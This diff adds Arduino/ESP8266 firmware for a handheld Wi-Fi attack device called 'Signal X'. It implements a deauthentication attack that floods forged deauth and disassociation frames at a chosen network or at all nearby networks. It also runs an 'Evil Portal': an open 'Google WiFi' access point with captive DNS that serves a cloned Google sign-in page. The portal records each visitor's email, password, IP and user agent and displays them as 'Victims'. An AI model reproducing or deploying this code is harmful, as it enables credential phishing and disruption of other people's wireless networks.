@@ -1,0 +1,710 @@
+#include <Arduino.h>
+#include <Wire.h>
+#include "SH1106Wire.h"
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#include <DNSServer.h>
+
+SH1106Wire display(0x3c, 5, 4);
+
+const byte DNS_PORT = 53;
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
+
+const int BTN_UP = 12;
+const int BTN_DOWN = 13;
+const int BTN_SELECT = 14;
+
+enum MenuState {
+    MAIN_MENU,
+    WIFI_SCANNING,
+    WIFI_RESULTS,
+    DEAUTH_LIST,
+    DEAUTH_ACTIVE,
+    DEAUTH_INFO,
+    PACKET_MON,
+    EVIL_PORTAL_MENU,
+    EVIL_PORTAL_RUNNING,
+    EVIL_PORTAL_CREDS
+};
+
+MenuState currentState = MAIN_MENU;
+int currentMenuItem = 0;
+
+const char* menuItems[] = {
+    "WiFi Scan",
+    "Deauth",
+    "Evil Portal",
+    "Packet Mon",
+    "Beacon",
+    "Probe",
+    "Settings"
+};
+
+const int MENU_ITEMS = 7;
+
+struct NetworkInfo {
+    String ssid;
+    int32_t rssi;
+    uint8_t encType;
+    String mac;
+    int channel;
+};
+
+struct Credentials {
+    String email;
+    String password;
+    String ip;
+    String deviceInfo;
+    String timestamp;
+};
+
+#define MAX_NETWORKS 50
+#define MAX_CREDS 10
+NetworkInfo networks[MAX_NETWORKS];
+Credentials capturedCreds[MAX_CREDS];
+int networkCount = 0;
+int currentNetwork = 0;
+int credsCount = 0;
+int currentPortalItem = 0;
+const char* portalItems[] = {"Google", "Amazon", "Apple"};
+const int PORTAL_ITEMS = 3;
+
+static unsigned long lastPacketCount = 0;
+static unsigned long lastDuration = 0;
+unsigned long attackStartTime = 0;
+int packetsCount = 0;
+String currentTarget = "";
+
+int currentChannel = 1;
+int packetsPerSecond = 0;
+int packetHistory[128] = {0};
+int historyIndex = 0;
+unsigned long lastSecond = 0;
+
+const char* loginHTML = R"(
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google</title>
+    <style>
+        body { font-family: 'Roboto', sans-serif; margin: 0; padding: 0; background: #fff; }
+        .container { width: 100%; max-width: 450px; margin: 0 auto; padding: 40px 20px; box-sizing: border-box; }
+        .logo { text-align: center; margin-bottom: 25px; }
+        .logo img { width: 75px; }
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; }
+        h2 { font-size: 16px; font-weight: 400; text-align: center; margin-bottom: 30px; color: #666; }
+        .form-group { margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        .btn { background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; float: right; }
+        .create-account { color: #1a73e8; text-decoration: none; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJAAAABQCAYAAADe6OUzAAAABHNCSVQICAgIfAhkiAAAABl0RVh0..." alt="Google">
+        </div>
+        <h1>Sign in</h1>
+        <h2>Continue to Gmail</h2>
+        <form action="/capture" method="POST">
+            <div class="form-group">
+                <input type="email" name="email" placeholder="Email or phone" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <div style="overflow: hidden;">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="btn">Next</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+)";
+
+void ICACHE_RAM_ATTR onPacket(uint8_t *buf, uint16_t len) {
+    lastPacketCount++;
+    packetHistory[historyIndex] = min(50, packetsPerSecond);
+    historyIndex = (historyIndex + 1) % 128;
+}
+
+String getEncryptionType(uint8_t type) {
+    switch (type) {
+        case ENC_TYPE_WEP: return "WEP";
+        case ENC_TYPE_TKIP: return "WPA";
+        case ENC_TYPE_CCMP: return "WPA2";
+        case ENC_TYPE_NONE: return "OPEN";
+        default: return "AUTO";
+    }
+}
+
+String getSignalStrength(int32_t rssi) {
+    if (rssi >= -50) return "Excellent";
+    if (rssi >= -60) return "Good";
+    if (rssi >= -70) return "Fair";
+    return "Poor";
+}
+
+void drawDotIndicators() {
+    const int dotSpacing = 6;
+    const int dotRadius = 1;
+    const int totalWidth = (MENU_ITEMS * dotSpacing);
+    int startX = 64 - (totalWidth / 2);
+    
+    for(int i = 0; i < MENU_ITEMS; i++) {
+        if(i == currentMenuItem) {
+            display.fillCircle(startX + (i * dotSpacing), 58, dotRadius);
+        } else {
+            display.drawCircle(startX + (i * dotSpacing), 58, dotRadius);
+        }
+    }
+}
+
+void drawMenu() {
+    display.clear();
+    display.setFont(ArialMT_Plain_10);
+    display.setTextAlignment(TEXT_ALIGN_CENTER);
+    display.drawString(64, 0, "Signal X");
+    
+    display.setTextAlignment(TEXT_ALIGN_RIGHT);
+    int batteryPercentage = map(analogRead(A0), 0, 1024, 0, 100);
+    String batteryText = String(batteryPercentage) + "%";
+    display.drawString(128, 0, batteryText);
+    
+    display.drawHorizontalLine(0, 12, 128);
+    
+    display.setTextAlignment(TEXT_ALIGN_CENTER);
+    display.setFont(ArialMT_Plain_16);
+    display.drawString(64, 24, menuItems[currentMenuItem]);
+    
+    display.drawString(10, 24, "<");
+    display.drawString(118, 24, ">");
+    
+    int16_t textWidth = display.getStringWidth(menuItems[currentMenuItem]);
+    int16_t lineStartX = 64 - (textWidth / 2);
+    display.drawHorizontalLine(lineStartX, 45, textWidth);
+    
+    drawDotIndicators();
+    
+    display.display();
+}
+
+void handleRoot() {
+    webServer.send(200, "text/html", loginHTML);
+}
+
+void handleCapture() {
+    if (credsCount < MAX_CREDS) {
+        capturedCreds[credsCount].email = webServer.arg("email");
+        capturedCreds[credsCount].password = webServer.arg("password");
+        capturedCreds[credsCount].ip = webServer.client().remoteIP().toString();
+        capturedCreds[credsCount].deviceInfo = webServer.header("User-Agent");
+        capturedCreds[credsCount].timestamp = String(millis() / 1000);
+        credsCount++;
+    }
+    webServer.sendHeader("Location", "https://accounts.google.com");
+    webServer.send(302, "text/plain", "");
+}
+
+void startGooglePortal() {
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP("Google WiFi");
+    
+    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+    
+    webServer.on("/", HTTP_GET, handleRoot);
+    webServer.on("/capture", HTTP_POST, handleCapture);
+    webServer.onNotFound(handleRoot);
+    webServer.begin();
+}
+
+void displayPortalRunning() {
+    display.clear();
+    display.setFont(ArialMT_Plain_10);
+    display.setTextAlignment(TEXT_ALIGN_LEFT);
+    display.drawString(0, 0, "Evil Portal Active");
+    display.drawHorizontalLine(0, 12, 128);
+    
+    display.drawString(0, 15, "SSID: Google WiFi");
+    display.drawString(0, 25, "IP: " + WiFi.softAPIP().toString());
+    display.drawString(0, 35, "Victims: " + String(credsCount));
+    display.drawString(0, 45, "Channel: " + String(WiFi.channel()));
+    display.drawString(0, 55, "Clients: " + String(WiFi.softAPgetStationNum()));
+    
+    display.display();
+}
+
+void displayCredentials() {
+    display.clear();
+    display.setFont(ArialMT_Plain_10);
+    display.setTextAlignment(TEXT_ALIGN_LEFT);
+    
+    if (credsCount == 0) {
+        display.drawString(0, 0, "No victims yet");
+    } else {
+        int currentPage = currentNetwork / 2;
+        int startIdx = currentPage * 2;
+        int itemsToShow = min(2, credsCount - startIdx);
+        
+        for(int i = 0; i < itemsToShow; i++) {
+            int idx = startIdx + i;
+            int yPos = i * 32;
+            display.drawString(0, yPos, "Victim " + String(idx + 1));
+            display.drawString(0, yPos + 10, capturedCreds[idx].email);
+            display.drawString(0, yPos + 20, "IP: " + capturedCreds[idx].ip);
+        }
+    }
+    display.display();
+}
+
+void performWiFiScan() {
+    const int SCAN_DURATION = 5000;
+    unsigned long scanStartTime = millis();
+    int foundNetworks = 0;
+    
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    WiFi.scanNetworksAsync([](int networksFound){}, true);
+    
+    while (millis() - scanStartTime < SCAN_DURATION) {
+        display.clear();
+        display.setFont(ArialMT_Plain_10);
+        display.setTextAlignment(TEXT_ALIGN_CENTER);
+        display.drawString(64, 0, "Signal X");
+        display.drawHorizontalLine(0, 12, 128);
+        
+        display.setFont(ArialMT_Plain_16);
+        display.drawString(64, 20, "SCANNING WIFI");
+        
+        int dotsCount = (millis() / 200) % 4;
+        String dots;
+        for(int i = 0; i < dotsCount; i++) {
+            dots += ".";
+        }
+        display.drawString(64, 38, dots);
+        
+        foundNetworks = WiFi.scanComplete();
+        if (foundNetworks > 0) {
+            display.setFont(ArialMT_Plain_10);
+            String networkText = String(foundNetworks) + " Networks";
+            display.drawString(64, 42, networkText);
+        }
+        
+        int progress = ((millis() - scanStartTime) * 100) / SCAN_DURATION;
+        int barWidth = (progress * 100) / 100;
+        display.drawRect(14, 54, 100, 8);
+        display.fillRect(14, 54, barWidth, 8);
+        
+        display.display();
+        delay(50);
+    }
+    
+    networkCount = WiFi.scanComplete();
+    if (networkCount > MAX_NETWORKS) networkCount = MAX_NETWORKS;
+    
+    for (int i = 0; i < networkCount; i++) {
+        networks[i].ssid = WiFi.SSID(i);
+        if (networks[i].ssid.length() == 0) {
+            networks[i].ssid = "Unknown Network";
+        }
+        networks[i].rssi = WiFi.RSSI(i);
+        networks[i].encType = WiFi.encryptionType(i);
+        networks[i].mac = WiFi.BSSIDstr(i);
+        networks[i].channel = WiFi.channel(i);
+    }
+}
+
+void performDeauth(const char* target_mac) {
+    uint8_t deauthPacket[26] = {
+        0xC0, 0x00,                 // Type/Subtype: Deauth
+        0x00, 0x00,                 // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // Destination: Broadcast
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // Source: AP MAC
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // BSSID: AP MAC
+        0x00, 0x00,                 // Sequence
+        0x07, 0x00                  // Reason: Class 3 frame from nonassociated STA
+    };
+    
+    uint8_t disassocPacket[26] = {
+        0xA0, 0x00,                 // Type/Subtype: Disassoc
+        0x00, 0x00,                 // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // Destination: Broadcast
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // Source: AP MAC
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // BSSID: AP MAC
+        0x00, 0x00,                 // Sequence
+        0x07, 0x00                  // Reason: Class 3 frame from nonassociated STA
+    };
+
+    sscanf(target_mac, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
+        &deauthPacket[10], &deauthPacket[11], &deauthPacket[12],
+        &deauthPacket[13], &deauthPacket[14], &deauthPacket[15]);
+ 
+ memcpy(&deauthPacket[16], &deauthPacket[10], 6);
+ memcpy(disassocPacket, deauthPacket, sizeof(deauthPacket));
+
+ wifi_set_channel(networks[currentNetwork].channel);
+ 
+ for(int i = 0; i < 4; i++) {
+     wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
+     delayMicroseconds(50);
+     wifi_send_pkt_freedom(disassocPacket, sizeof(disassocPacket), 0);
+     delayMicroseconds(50);
+ }
+ 
+ packetsCount += 8;
+}
+
+void displayDeauthList() {
+ display.clear();
+ display.setFont(ArialMT_Plain_10);
+ display.setTextAlignment(TEXT_ALIGN_LEFT);
+ display.drawString(0, 0, "Select Target:");
+ display.drawHorizontalLine(0, 12, 128);
+ 
+ int startIdx = (currentNetwork / 4) * 4;
+ int itemsToShow = min(4, networkCount + 1 - startIdx);
+ 
+ for(int i = 0; i < itemsToShow; i++) {
+     int actualIdx = startIdx + i;
+     String itemText;
+     
+     if(actualIdx < networkCount) {
+         itemText = networks[actualIdx].ssid;
+     } else {
+         itemText = "DEAUTH ALL";
+     }
+     
+     if(itemText.length() > 16) {
+         itemText = itemText.substring(0, 14) + "..";
+     }
+     
+     if(actualIdx == currentNetwork) {
+         display.fillRect(0, 14 + (i * 12), 128, 11);
+         display.setColor(BLACK);
+     }
+     display.drawString(2, 14 + (i * 12), itemText);
+     display.setColor(WHITE);
+ }
+ 
+ display.display();
+}
+
+void displayDeauthInfo() {
+ display.clear();
+ display.setFont(ArialMT_Plain_10);
+ display.setTextAlignment(TEXT_ALIGN_CENTER);
+ display.drawString(64, 0, "DEAUTH ATTACK");
+ display.drawHorizontalLine(0, 12, 128);
+ 
+ display.setTextAlignment(TEXT_ALIGN_LEFT);
+ display.drawString(0, 15, "Target: " + currentTarget);
+ 
+ lastDuration = (millis() - attackStartTime) / 1000;
+ String timeStr = String(lastDuration) + "s";
+ display.drawString(0, 27, "Duration: " + timeStr);
+ 
+ lastPacketCount = packetsCount;
+ display.drawString(0, 39, "Packets: " + String(lastPacketCount));
+ 
+ display.drawString(0, 51, "Channel: " + String(networks[currentNetwork].channel));
+ 
+ display.display();
+}
+
+void displayPortalMenu() {
+    display.clear();
+    display.setFont(ArialMT_Plain_10);
+    display.setTextAlignment(TEXT_ALIGN_CENTER);
+    display.drawString(64, 0, "Evil Portal");
+    display.drawHorizontalLine(0, 12, 128);
+
+    for (int i = 0; i < PORTAL_ITEMS; i++) {
+        if (i == currentPortalItem) {
+            display.fillRect(0, 14 + (i * 12), 128, 11);
+            display.setColor(BLACK);
+        }
+        display.drawString(64, 14 + (i * 12), portalItems[i]);
+        display.setColor(WHITE);
+    }
+
+    display.display();
+}
+
+void displayPacketMonitor() {
+ display.clear();
+ display.setFont(ArialMT_Plain_10);
+ display.setTextAlignment(TEXT_ALIGN_CENTER);
+ display.drawString(64, 0, "Signal X");
+ display.drawHorizontalLine(0, 12, 128);
+ 
+ display.drawVerticalLine(85, 12, 52);
+ 
+ for(int i = 0; i < 84; i++) {
+     int x = i;
+     int height = map(packetHistory[(historyIndex + i) % 128], 0, 50, 0, 45);
+     if(height > 0) {
+         int lineWidth = map(height, 0, 45, 1, 3);
+         for(int w = 0; w < lineWidth; w++) {
+             display.drawVerticalLine(x, 64 - height, height);
+         }
+     }
+ }
+ 
+ display.setTextAlignment(TEXT_ALIGN_LEFT);
+ display.drawString(88, 15, "CH: " + String(currentChannel));
+ display.drawString(88, 27, "Pkt/s: " + String(packetsPerSecond));
+ display.drawString(88, 39, "Tot: " + String(lastPacketCount));
+ display.drawString(88, 51, "dB: " + String(WiFi.RSSI()));
+ 
+ display.display();
+}
+
+void handleDeauthAttack() {
+ if(!attackStartTime) {
+     attackStartTime = millis();
+     packetsCount = 0;
+ }
+ 
+ if(currentNetwork == networkCount) {
+     currentTarget = "ALL NETWORKS";
+     for(int i = 0; i < networkCount; i++) {
+         currentNetwork = i;
+         performDeauth(networks[i].mac.c_str());
+     }
+ } else {
+     currentTarget = networks[currentNetwork].ssid;
+     performDeauth(networks[currentNetwork].mac.c_str());
+ }
+}
+
+String getWiFiBand(int channel) {
+    if (channel >= 1 && channel <= 14) {
+        return "2.4 GHz";
+    } else {
+        return "5 GHz";
+    }
+}
+
+void displayNetworkInfo() {
+    display.clear();
+    display.setFont(ArialMT_Plain_10);
+
+    display.setTextAlignment(TEXT_ALIGN_LEFT);
+    display.drawString(0, 0, String(networkCount) + " Networks");
+    display.setTextAlignment(TEXT_ALIGN_RIGHT);
+    display.drawString(128, 0, String(currentNetwork + 1) + "/" + String(networkCount));
+    display.drawHorizontalLine(0, 12, 128);
+
+    if (networkCount > 0) {
+        display.setTextAlignment(TEXT_ALIGN_LEFT);
+        String ssidTruncated = networks[currentNetwork].ssid;
+        if (ssidTruncated.length() > 16) {
+            ssidTruncated = ssidTruncated.substring(0, 14) + "..";
+        }
+        display.drawString(0, 15, "Network:");
+        display.drawString(50, 15, ssidTruncated);
+
+        display.drawString(0, 27, "Signal:");
+        display.drawString(50, 27, getSignalStrength(networks[currentNetwork].rssi));
+        display.setTextAlignment(TEXT_ALIGN_RIGHT);
+        display.drawString(128, 27, String(networks[currentNetwork].rssi) + "dB");
+
+        display.setTextAlignment(TEXT_ALIGN_LEFT);
+        display.drawString(0, 39, "Security:");
+        display.drawString(50, 39, getEncryptionType(networks[currentNetwork].encType));
+        display.setTextAlignment(TEXT_ALIGN_RIGHT);
+        display.drawString(128, 39, "Ch:" + String(networks[currentNetwork].channel));
+
+        display.setTextAlignment(TEXT_ALIGN_LEFT);
+        display.drawString(0, 51, getWiFiBand(networks[currentNetwork].channel));
+        display.setTextAlignment(TEXT_ALIGN_RIGHT);
+        String macShort = networks[currentNetwork].mac.substring(9);
+        display.drawString(128, 51, macShort);
+    }
+    
+    display.display();
+}void setup() {
+ display.init();
+ display.flipScreenVertically();
+ display.setFont(ArialMT_Plain_16);
+ display.setTextAlignment(TEXT_ALIGN_CENTER);
+ 
+ pinMode(BTN_UP, INPUT_PULLUP);
+ pinMode(BTN_DOWN, INPUT_PULLUP);
+ pinMode(BTN_SELECT, INPUT_PULLUP);
+ pinMode(A0, INPUT);
+
+ WiFi.mode(WIFI_STA);
+ WiFi.disconnect();
+}
+
+void loop() {
+ static unsigned long lastDebounceTime = 0;
+ const unsigned long debounceDelay = 200;
+ static unsigned long lastAttackUpdate = 0;
+ static unsigned long lastDisplayUpdate = 0;
+ 
+ if ((millis() - lastDebounceTime) > debounceDelay) {
+     if (currentState == MAIN_MENU) {
+         if (digitalRead(BTN_UP) == LOW) {
+             if (currentMenuItem > 0) {
+                 currentMenuItem--;
+                 lastDebounceTime = millis();
+             }
+         }
+         if (digitalRead(BTN_DOWN) == LOW) {
+             if (currentMenuItem < MENU_ITEMS - 1) {
+                 currentMenuItem++;
+                 lastDebounceTime = millis();
+             }
+         }
+         if (digitalRead(BTN_SELECT) == LOW) {
+             if (currentMenuItem == 0) {
+                 currentState = WIFI_SCANNING;
+                 performWiFiScan();
+                 currentState = WIFI_RESULTS;
+             } 
+             else if (currentMenuItem == 1) {
+                 currentState = WIFI_SCANNING;
+                 performWiFiScan();
+                 currentState = DEAUTH_LIST;
+                 currentNetwork = 0;
+             }
+             else if (currentMenuItem == 2) {
+                 currentState = EVIL_PORTAL_MENU;
+                 currentPortalItem = 0;
+             }
+             else if (currentMenuItem == 3) {
+                 currentState = PACKET_MON;
+                 wifi_set_channel(currentChannel);
+                 wifi_promiscuous_enable(1);
+                 wifi_set_promiscuous_rx_cb(onPacket);
+             }
+             lastDebounceTime = millis();
+         }
+     }
+     else if (currentState == WIFI_RESULTS) {
+         if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
+             currentNetwork--;
+             lastDebounceTime = millis();
+         }
+         if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount - 1) {
+             currentNetwork++;
+             lastDebounceTime = millis();
+         }
+         if (digitalRead(BTN_SELECT) == LOW) {
+             currentState = MAIN_MENU;
+             lastDebounceTime = millis();
+         }
+     }
+     else if (currentState == DEAUTH_LIST) {
+         if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
+             currentNetwork--;
+             lastDebounceTime = millis();
+         }
+         if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount) {
+             currentNetwork++;
+             lastDebounceTime = millis();
+         }
+         if (digitalRead(BTN_SELECT) == LOW) {
+             handleDeauthAttack();
+             currentState = DEAUTH_INFO;
+             lastDebounceTime = millis();
+         }
+     }
+     else if (currentState == DEAUTH_INFO) {
+         if (digitalRead(BTN_SELECT) == LOW) {
+             currentState = MAIN_MENU;
+             attackStartTime = 0;
+             lastDebounceTime = millis();
+         }
+         if (millis() - lastAttackUpdate > 50) {
+             handleDeauthAttack();
+             lastAttackUpdate = millis();
+         }
+     }
+     else if (currentState == EVIL_PORTAL_MENU) {
+         if (digitalRead(BTN_UP) == LOW && currentPortalItem > 0) {
+             currentPortalItem--;
+             lastDebounceTime = millis();
+         }
+         if (digitalRead(BTN_DOWN) == LOW && currentPortalItem < PORTAL_ITEMS - 1) {
+             currentPortalItem++;
+             lastDebounceTime = millis();
+         }
+         if (digitalRead(BTN_SELECT) == LOW) {
+             if (currentPortalItem == 0) {
+                 currentState = EVIL_PORTAL_RUNNING;
+                 startGooglePortal();
+             }
+             lastDebounceTime = millis();
+         }
+     }
+     else if (currentState == EVIL_PORTAL_RUNNING) {
+         dnsServer.processNextRequest();
+         webServer.handleClient();
+         if (digitalRead(BTN_SELECT) == LOW) {
+             currentState = EVIL_PORTAL_CREDS;
+             lastDebounceTime = millis();
+         }
+     }
+     else if (currentState == EVIL_PORTAL_CREDS) {
+         if (digitalRead(BTN_SELECT) == LOW) {
+             currentState = EVIL_PORTAL_MENU;
+             lastDebounceTime = millis();
+         }
+     }
+     else if (currentState == PACKET_MON) {
+         if (digitalRead(BTN_UP) == LOW && currentChannel < 14) {
+             currentChannel++;
+             wifi_set_channel(currentChannel);
+             lastDebounceTime = millis();
+         }
+         if (digitalRead(BTN_DOWN) == LOW && currentChannel > 1) {
+             currentChannel--;
+             wifi_set_channel(currentChannel);
+             lastDebounceTime = millis();
+         }
+         if (digitalRead(BTN_SELECT) == LOW) {
+             currentState = MAIN_MENU;
+             wifi_promiscuous_enable(0);
+             lastDebounceTime = millis();
+         }
+         
+         if(millis() - lastSecond >= 1000) {
+             packetsPerSecond = lastPacketCount;
+             lastPacketCount = 0;
+             lastSecond = millis();
+         }
+     }
+ }
+
+ if (currentState == MAIN_MENU) {
+     drawMenu();
+ }
+ else if (currentState == WIFI_RESULTS) {
+     displayNetworkInfo();
+ }
+ else if (currentState == DEAUTH_LIST) {
+     displayDeauthList();
+ }
+ else if (currentState == DEAUTH_INFO) {
+     displayDeauthInfo();
+ }
+ else if (currentState == EVIL_PORTAL_MENU) {
+     displayPortalMenu();
+ }
+ else if (currentState == EVIL_PORTAL_RUNNING) {
+     displayPortalRunning();
+ }
+ else if (currentState == EVIL_PORTAL_CREDS) {
+     displayCredentials();
+ }
+ else if (currentState == PACKET_MON) {
+     displayPacketMonitor();
+ }
+}
